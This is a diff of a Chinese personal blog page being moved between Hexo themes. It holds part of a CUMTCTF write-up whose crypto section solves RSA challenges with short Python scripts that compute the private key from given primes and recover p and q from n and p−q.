egcd(b % a, a)</span><br><span class="line">    <span class="keyword">return</span> (g, x - (b // a) * y, y)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">modinv</span>(<span class="params">a, m</span>):</span></span><br><span class="line">  g, x, y = egcd(a, m)</span><br><span class="line">  <span class="keyword">if</span> g != <span class="number">1</span>:</span><br><span class="line">    print(<span class="string">&#x27;modular inverse does not exist&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;null&#x27;</span></span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">return</span> x % m</span><br><span class="line">c = <span class="number">40448992051548719008529549070468060415257485938698092782029814901918646701101</span></span><br><span class="line">p = <span class="number">328413456989577256301798468872388310877</span></span><br><span class="line">q = <span class="number">324350545929838254331191385863847627003</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">n = p * q</span><br><span class="line">d = modinv(e, (p - <span class="number">1</span>) * (q - <span class="number">1</span>))</span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> (m)</span><br></pre></td></tr></table></figure>
 
 
 
 <p>数字转字符的脚本</p>
-<div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">import</span> binascii
-<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">n2s</span><span class="hljs-params">(num)</span>:</span>
-  t = hex(num)[<span class="hljs-number">2</span>:<span class="hljs-number">-1</span>]  <span class="hljs-comment"># python</span>
-  <span class="hljs-keyword">if</span> len(t) % <span class="hljs-number">2</span> == <span class="hljs-number">1</span>:
-    t = <span class="hljs-string">'0'</span> + t
-  \<span class="hljs-comment">#print(t)</span>
-  <span class="hljs-keyword">return</span>(binascii.a2b_hex(t).decode(<span class="hljs-string">'latin1'</span>))
-print(n2s(a)) <span class="hljs-comment">#a为上一个脚本计算出的数字</span></code></pre></div>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">n2s</span>(<span class="params">num</span>):</span></span><br><span class="line">  t = <span class="built_in">hex</span>(num)[<span class="number">2</span>:-<span class="number">1</span>]  <span class="comment"># python</span></span><br><span class="line">  <span class="keyword">if</span> <span class="built_in">len</span>(t) % <span class="number">2</span> == <span class="number">1</span>:</span><br><span class="line">    t = <span class="string">&#x27;0&#x27;</span> + t</span><br><span class="line">  \<span class="comment">#print(t)</span></span><br><span class="line">  <span class="keyword">return</span>(binascii.a2b_hex(t).decode(<span class="string">&#x27;latin1&#x27;</span>))</span><br><span class="line">print(n2s(a)) <span class="comment">#a为上一个脚本计算出的数字</span></span><br></pre></td></tr></table></figure>
 
 
 
 <h3 id="小学生的密码题"><a href="#小学生的密码题" class="headerlink" title="小学生的密码题"></a>小学生的密码题</h3><h3 id="初中生的密码题"><a href="#初中生的密码题" class="headerlink" title="初中生的密码题"></a>初中生的密码题</h3><p>次题与幼儿园的类似，但是由于n过大，试了很多工具都无法分解。</p>
 <p>仔细看题会发现这题的条件给的比较多,知道p-q</p>
 <p>于是想到了<code>(p+q)^2-(p-q)^2=4pq=4n</code>，可以算出p+q,之后解出p,q</p>
-<div class="hljs"><pre><code class="hljs python">算p,q的脚本
-<span class="hljs-comment"># -*- coding = utf - 8 -*-</span>
-<span class="hljs-comment">#@Time : 2020/9/24 21:55</span>
-<span class="hljs-comment">#@Author : sunzy</span>
-<span class="hljs-comment">#@File : su.py</span>
-<span class="hljs-keyword">import</span> gmpy2
-n = <span class="hljs-number">848636981711330203910533960833570455347986345690792054016750216327432282027653737545502731789145875082064910377585125307004316982829408169391535303284775605083341204318559328114199464933306718077358184455649201353500348066849356092072732731595459583112558025395897556853371526959018489282157258240657926428930442774978485014507505784476690845099227369478496626645851076679385883251594929952035661085961598388544126711902983065521128172978259778754970695037278639045266353840536697343675638366506183715240679610094431082173271579344392346412454309134164388560354168918421706979410826758333952277436780339926907679282601846125790204266958409253210507301575619878252146515542791259716201124558373197816421305046774535734189567481599690381428371580696486054135486182509762880877363356256116336930055483318415453999460475103494980748558993889459677374574910745242385711928489669790527969454801533682757508950065697410745338257289717598141031203566419840587221470340637486034911686587695890702753064441476917845870069997649577034149354150224132983093069444866234262542625997399303875938451386377357399819123134018307163799151847997740448433278364764592560369020005024859119937315831252233159882960532854116233641920659786799836075681746397</span>
-p_sub_q = <span class="hljs-number">-3052070064538177039316204197190587772604720575847063904632214287646067455053231054471310322671549035272267675314294983896730810628462303176753740499536650509067032550999649642312183001467325569057721784454105443122299599368088210370664912463545058026638059476152117310712548608873763578306375998350729040793659145108802752313856984121444358377361896069243965149432626400631035486457915394853541729904150184876824863707417199152978276518660302136096681722191666079256269268999389217644896376343059852127338281844120448782198891495913902938174313438531667749920307775936355947018946620720978288405012504885451732231636</span>
-x = (<span class="hljs-number">4</span>*n+p_sub_q*p_sub_q)
-
-gmpy2.mpz(x)
-<span class="hljs-comment">#p_add_q = gmpy2.iroot(x, 2)</span>
-p_add_q = <span class="hljs-number">58342634998122692674032973234620896020471694068399847453520741898744437026570834277134765347908181270295928479896424327076716339778780713227054670754114006755614107059128760453507315091935855120450792252194791430498450216725579392051311373554303029775579999984765816108626868293630358812164765119470747267373609041885833415440716244492402495944064255436477147868576748300862501670473856373437423326957856588782039066794320093570665076624361151742737113922376038763268964187459938086360191752544167623804772397201519904950840301831333585995087985697059748872751988663760065650743406672809203915981347563824970092886078</span>
-<span class="hljs-comment"># print(p_add_q)</span>
-y=(p_sub_q+p_add_q)
-z=(p_add_q-p_sub_q)
-
-print(y&gt;&gt;<span class="hljs-number">1</span>)
-print(z&gt;&gt;<span class="hljs-number">1</span>)</code></pre></div>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">算p,q的脚本</span><br><span class="line"><span class="comment"># -*- coding = utf - 8 -*-</span></span><br><span class="line"><span class="comment">#@Time : 2020/9/24 21:55</span></span><br><span class="line"><span class="comment">#@Author : sunzy</span></span><br><span class="line"><span class="comment">#@File : su.py</span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">n = <span class="number">848636981711330203910533960833570455347986345690792054016750216327432282027653737545502731789145875082064910377585125307004316982829408169391535303284775605083341204318559328114199464933306718077358184455649201353500348066849356092072732731595459583112558025395897556853371526959018489282157258240657926428930442774978485014507505784476690845099227369478496626645851076679385883251594929952035661085961598388544126711902983065521128172978259778754970695037278639045266353840536697343675638366506183715240679610094431082173271579344392346412454309134164388560354168918421706979410826758333952277436780339926907679282601846125790204266958409253210507301575619878252146515542791259716201124558373197816421305046774535734189567481599690381428371580696486054135486182509762880877363356256116336930055483318415453999460475103494980748558993889459677374574910745242385711928489669790527969454801533682757508950065697410745338257289717598141031203566419840587221470340637486034911686587695890702753064441476917845870069997649577034149354150224132983093069444866234262542625997399303875938451386377357399819123134018307163799151847997740448433278364764592560369020005024859119937315831252233159882960532854116233641920659786799836075681746397</span></span><br><span class="line">p_sub_q = -<span class="number">3052070064538177039316204197190587772604720575847063904632214287646067455053231054471310322671549035272267675314294983896730810628462303176753740499536650509067032550999649642312183001467325569057721784454105443122299599368088210370664912463545058026638059476152117310712548608873763578306375998350729040793659145108802752313856984121444358377361896069243965149432626400631035486457915394853541729904150184876824863707417199152978276518660302136096681722191666079256269268999389217644896376343059852127338281844120448782198891495913902938174313438531667749920307775936355947018946620720978288405012504885451732231636</span></span><br><span class="line">x = (<span class="number">4</span>*n+p_sub_q*p_sub_q)</span><br><span class="line"></span><br><span class="line">gmpy2.mpz(x)</span><br><span class="line"><span class="comment">#p_add_q = gmpy2.iroot(x, 2)</span></span><br><span class="line">p_add_q = <span class="number">58342634998122692674032973234620896020471694068399847453520741898744437026570834277134765347908181270295928479896424327076716339778780713227054670754114006755614107059128760453507315091935855120450792252194791430498450216725579392051311373554303029775579999984765816108626868293630358812164765119470747267373609041885833415440716244492402495944064255436477147868576748300862501670473856373437423326957856588782039066794320093570665076624361151742737113922376038763268964187459938086360191752544167623804772397201519904950840301831333585995087985697059748872751988663760065650743406672809203915981347563824970092886078</span></span><br><span class="line"><span class="comment"># print(p_add_q)</span></span><br><span class="line">y=(p_sub_q+p_add_q)</span><br><span class="line">z=(p_add_q-p_sub_q)</span><br><span class="line"></span><br><span class="line">print(y&gt;&gt;<span class="number">1</span>)</span><br><span class="line">print(z&gt;&gt;<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
 
 <p>知道p,q后，此题的解法与幼儿园的解法相同</p>
 <p>菜鸡只会这么多。。。</p>
-
-            </div>
-            <hr>
-            <div>
-              <div class="post-metas mb-3">
-                
-                  <div class="post-meta mr-3">
-                    <i class="iconfont icon-category"></i>
-                    
-                      <a class="hover-with-bg" href="/categories/ctf/">ctf</a>
-                    
-                  </div>
-                
-                
-                  <div class="post-meta">
-                    <i class="iconfont icon-tags"></i>
-                    
-                      <a class="hover-with-bg" href="/tags/sql/">sql</a>
-                    
-                      <a class="hover-with-bg" href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">文件包含</a>
-                    
-                      <a class="hover-with-bg" href="/tags/rsa/">rsa</a>
-                    
-                  </div>
-                
-              </div>
-              
-                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" target="_blank" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
-              
-              
-                <div class="post-prevnext row">
-                  <article class="post-prev col-6">
-                    
-                    
-                      <a href="/2020/09/27/homework/">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">网安作业1</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
-                  </article>
-                  <article class="post-next col-6">
-                    
-                    
-                      <a href="/2020/09/27/fakebook/">
-                        <span class="hidden-mobile">fakebook</span>
-                        <span class="visible-mobile">下一篇</span>
-                        <i class="iconfont icon-arrowright"></i>
-                      </a>
-                    
-                  </article>
-                </div>
-              
-            </div>
-
-            
-              <!-- Comments -->
-              <article class="comments" id="comments">
-                
-                
-  <div id="vcomments"></div>
-  <script type="text/javascript">
-    function loadValine() {
-      addScript('https://cdn.jsdelivr.net/gh/HCLonely/Valine@latest/dist/Valine.min.js', function () {
-        new Valine({
-          el: "#vcomments",
-          app_id: "2rPljbm5WOxA9BCPXqy3VE5y-gzGzoHsz",
-          app_key: "SCoIn2Qp99a7ITtPhkAi6Chw",
-          placeholder: "说点什么吧~~~",
-          path: window.location.pathname,
-          avatar: "retro",
-          meta: ["nick","mail","link"],
-          pageSize: "10",
-          lang: "zh-CN",
-          highlight: true,
-          recordIP: false,
-          serverURLs: "",
-          master: "4cd096660a71d786a2a4d9d0bb4e8996",
-          friends: "b275f0fc8103331da645a878cf60f841",
-          tagMeta: ["博主","友人","访客"],
-        });
-      });
-    }
-    waitElementVisible('vcomments', loadValine);
-  </script>
-  <noscript>Please enable JavaScript to view the <a href="https://valine.js.org" target="_blank" rel="nofollow noopener noopener">comments
-      powered by Valine.</a></noscript>
-
-
-              </article>
-            
-          </article>
-        </div>
-      </div>
-    </div>
-    
-      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
-        <div id="toc">
-  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
-  <div id="tocbot"></div>
-</div>
-
-      </div>
-    
-  </div>
-</div>
-
-<!-- Custom -->
-
-  <div class="col-lg-7 mx-auto nopadding-md">
-    <div class="container custom post-content mx-auto">
-      <img src="https://octodex.github.com/images/jetpacktocat.png" srcset="/img/loading.gif" class="rounded mx-auto d-block mt-5" style="width:150px; height:150px;">
-    </div>
-  </div>
-
-
-    
-  </main>
-
-  
-    <a id="scroll-top-button" href="#" role="button">
-      <i class="iconfont icon-arrowup" aria-hidden="true"></i>
-    </a>
-  
-
-  
-    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
-     aria-hidden="true">
-  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
-    <div class="modal-content">
-      <div class="modal-header text-center">
-        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
-        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
-          <span aria-hidden="true">&times;</span>
-        </button>
-      </div>
-      <div class="modal-body mx-3">
-        <div class="md-form mb-5">
-          <input type="text" id="local-search-input" class="form-control validate">
-          <label data-error="x" data-success="v"
-                 for="local-search-input">关键词</label>
-        </div>
-        <div class="list-group" id="local-search-result"></div>
-      </div>
-    </div>
-  </div>
-</div>
-  
-
-  
-
-  <footer class="text-center mt-5 py-3">
-  <div class="footer-content">
-     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
-  </div>
-  
-  <div class="statistics">
-    
-    
-
-    
-      
-        <!-- 不蒜子统计PV -->
-        <span id="busuanzi_container_site_pv" style="display: none">
-            总访问量 
-            <span id="busuanzi_value_site_pv"></span>
-             次
-          </span>
-      
-      
-        <!-- 不蒜子统计UV -->
-        <span id="busuanzi_container_site_uv" style="display: none">
-            总访客数 
-            <span id="busuanzi_value_site_uv"></span>
-             人
-          </span>
-      
-    
-  </div>
-
-
-  
-
-  
-</footer>
-
-<!-- SCRIPTS -->
-<script  src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js" ></script>
-<script  src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js" ></script>
-<script  src="/js/debouncer.js" ></script>
-<script  src="/js/main.js" ></script>
-
-<!-- Plugins -->
-
-
-  
-    <script  src="/js/lazyload.js" ></script>
-  
-
-
-
-  
-
-
-
-  <script defer src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js" ></script>
-  <script  src="/js/clipboard-use.js" ></script>
-
-
-
-  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
-
-
-
-
-
-  <script  src="https://cdn.staticfile.org/tocbot/4.11.1/tocbot.min.js" ></script>
-  <script>
-    $(document).ready(function () {
-      var boardCtn = $('#board-ctn');
-      var boardTop = boardCtn.offset().top;
-
-      tocbot.init({
-        tocSelector: '#tocbot',
-        contentSelector: '#post-body',
-        headingSelector: 'h1,h2,h3,h4,h5,h6',
-        linkClass: 'tocbot-link',
-        activeLinkClass: 'tocbot-active-link',
-        listClass: 'tocbot-list',
-        isCollapsedClass: 'tocbot-is-collapsed',
-        collapsibleClass: 'tocbot-is-collapsible',
-        collapseDepth: 0,
-        scrollSmooth: true,
-        headingsOffset: -boardTop
-      });
-      if ($('.toc-list-item').length > 0) {
-        $('#toc').css('visibility', 'visible');
-      }
-    });
-  </script>
-
-
-
-  <script  src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js" ></script>
-  <script>
-    var typed = new Typed('#subtitle', {
-      strings: [
-        '  ',
-        "cumtctf&nbsp;",
-      ],
-      cursorChar: "_",
-      typeSpeed: 70,
-      loop: true,
-    });
-    typed.stop();
-    $(document).ready(function () {
-      $(".typed-cursor").addClass("h2");
-      typed.start();
-    });
-  </script>
-
-
-
-  <script  src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js" ></script>
-  <script>
-    anchors.options = {
-      placement: "right",
-      visible: "hover",
-      
-      icon: "§"
-      
-    };
-    var el = "h1,h2,h3,h4,h5,h6".split(",");
-    var res = [];
-    for (item of el) {
-      res.push(".markdown-body > " + item)
-    }
-    anchors.add(res.join(", "))
-  </script>
-
-
-
-  <script  src="/js/local-search.js" ></script>
-  <script>
-    var path = "/local-search.xml";
-    var inputArea = document.querySelector("#local-search-input");
-    inputArea.onclick = function () {
-      searchFunc(path, 'local-search-input', 'local-search-result');
-      this.onclick = null
-    }
-  </script>
-
-
-
-  <script  src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>
-  <link  rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />
-
-  <script>
-    $('#post img:not(.no-zoom img, img[no-zoom]), img[zoom]').each(
-      function () {
-        var element = document.createElement('a');
-        $(element).attr('data-fancybox', 'images');
-        $(element).attr('href', $(this).attr('src'));
-        $(this).wrap(element);
-      }
-    );
-  </script>
-
-
-
-
-
-
-
-
-
-
-
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-
-
-<div class="text-center py-1">   
-  <div>
-    <span>Copyright © 2020</span></a>
-    <a href="http://sunzy.icu/" target="_blank" rel="nofollow noopener">
-     <span>my blog</span></a>    <br>
-  </div>
-<div>
-  <span id="timeDate">载入天数...</span>
-  <span id="times">载入时分秒...</span>
-  <script>
-  var now = new Date();
-  function createtime(){
-      var grt= new Date("03/02/2020 00:00:00");//此处修改你的建站时间或者网站上线时间
-      now.setTime(now.getTime()+250);
-      days = (now - grt ) / 1000 / 60 / 60 / 24;
-      dnum = Math.floor(days);
-      hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum);
-      hnum = Math.floor(hours);
-      if(String(hnum).length ==1 ){
-          hnum = "0" + hnum;
-      }
-      minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum);
-      mnum = Math.floor(minutes);
-      if(String(mnum).length ==1 ){
-                mnum = "0" + mnum;
-      }
-      seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);
-      snum = Math.round(seconds);
-      if(String(snum).length ==1 ){
-                snum = "0" + snum;
-      }
-      document.getElementById("timeDate").innerHTML = "🚀 for&nbsp"+dnum+"&nbspdays";  //此次自定义显示内容
-      document.getElementById("times").innerHTML = hnum + "&nbsphr&nbsp" + mnum + "&nbspmin&nbsp" + snum + "&nbspsec";
-  }  //此次自定义显示内容
-  setInterval("createtime()",250);
-  </script>
-</div>
-
-<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"model":{"jsonPath":"/live2dw/assets/wanko.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":false},"log":false});</script></body>
-</html>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">sunzy</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://sunzhengyu99.github.io/2020/09/27/cumtctf/">https://sunzhengyu99.github.io/2020/09/27/cumtctf/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://sunzhengyu99.github.io" target="_blank">一路走到黑</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/sql/">sql</a><a class="post-meta__tags" href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">文件包含</a><a class="post-meta__tags" href="/tags/rsa/">rsa</a></div><div class="post_share"><div class="social-share" data-image="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2020/09/27/homework/"><img class="prev-cover" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">网安作业1</div></div></a></div><div class="next-post pull-right"><a href="/2020/09/27/fakebook/"><img class="next-cover" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">fakebook</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span> 相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2020/09/28/BJDCTF2020/" title="BJDCTF2020"><img class="cover" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2020-09-28</div><div class="title">BJDCTF2020</div></div></a></div><div><a href="/2020/08/08/Bugku/" title="Bugku"><img class="cover" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2020-08-08</div><div class="title">Bugku</div></div></a></div><div><a href="/2020/09/06/bugku1-10/" title="bugku1-10"><img class="cover" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2020-09-06</div><div class="title">bugku1-10</div></div></a></div><div><a href="/2020/09/27/fakebook/" title="fakebook"><img class="cover" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2020-09-27</div><div class="title">fakebook</div></div></a></div><div><a href="/2020/09/02/nctf-2/" title="nctf-2"><img class="cover" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2020-09-02</div><div class="title">nctf-2</div></div></a></div><div><a href="/2020/08/29/nctf/" title="nctf"><img class="cover" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2020-08-29</div><div class="title">nctf</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-info-avatar is-center"><img class="avatar-img" src="/null" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-info__name">sunzy</div><div class="author-info__description"></div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">41</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">标签</div><div class="length-num">51</div></a></div><div class="card-info-data-item is-center"><a href="/categories/"><div class="headline">分类</div><div class="length-num">12</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#CUMTCTF-wp"><span class="toc-number">1.</span> <span class="toc-text">CUMTCTF-wp</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Web"><span class="toc-number">1.1.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AD%BE%E5%88%B0"><span class="toc-number">1.1.1.</span> <span class="toc-text">签到</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#babysql"><span class="toc-number">1.1.2.</span> <span class="toc-text">babysql</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#secret"><span class="toc-number">1.1.3.</span> <span class="toc-text">secret</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#babysql2"><span class="toc-number">1.1.4.</span> <span class="toc-text">babysql2</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Crypto"><span class="toc-number">1.2.</span> <span class="toc-text">Crypto</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B9%BC%E5%84%BF%E5%9B%AD%E7%9A%84%E5%AF%86%E7%A0%81%E9%A2%98"><span class="toc-number">1.2.1.</span> <span class="toc-text">幼儿园的密码题</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B0%8F%E5%AD%A6%E7%94%9F%E7%9A%84%E5%AF%86%E7%A0%81%E9%A2%98"><span class="toc-number">1.2.2.</span> <span class="toc-text">小学生的密码题</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%9D%E4%B8%AD%E7%94%9F%E7%9A%84%E5%AF%86%E7%A0%81%E9%A2%98"><span class="toc-number">1.2.3.</span> <span class="toc-text">初中生的密码题</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2021/02/08/flask/" title="flask"><img src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="flask"/></a><div class="content"><a class="title" href="/2021/02/08/flask/" title="flask">flask</a><time datetime="2021-02-08T07:13:40.000Z" title="发表于 2021-02-08 15:13:40">2021-02-08</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/02/03/winter-homework/" title="winter_homework"><img src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="winter_homework"/></a><div class="content"><a class="title" href="/2021/02/03/winter-homework/" title="winter_homework">winter_homework</a><time datetime="2021-02-03T13:49:09.000Z" title="发表于 2021-02-03 21:49:09">2021-02-03</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/01/30/sql-labs/" title="sql_labs"><img src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="sql_labs"/></a><div class="content"><a class="title" href="/2021/01/30/sql-labs/" title="sql_labs">sql_labs</a><time datetime="2021-01-30T13:13:02.000Z" title="发表于 2021-01-30 21:13:02">2021-01-30</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/01/11/cumtfinal/" title="cumtfinal"><img src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="cumtfinal"/></a><div class="content"><a class="title" href="/2021/01/11/cumtfinal/" title="cumtfinal">cumtfinal</a><time datetime="2021-01-11T14:04:30.000Z" title="发表于 2021-01-11 22:04:30">2021-01-11</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2020/12/23/%E5%AF%86%E7%A0%81%E5%AD%A6/" title="密码学"><img src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="密码学"/></a><div class="content"><a class="title" href="/2020/12/23/%E5%AF%86%E7%A0%81%E5%AD%A6/" title="密码学">密码学</a><time datetime="2020-12-23T08:37:43.000Z" title="发表于 2020-12-23 16:37:43">2020-12-23</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2021 By sunzy</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"model":{"jsonPath":"/live2dw/assets/wanko.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":false},"log":false});</script></body></html>
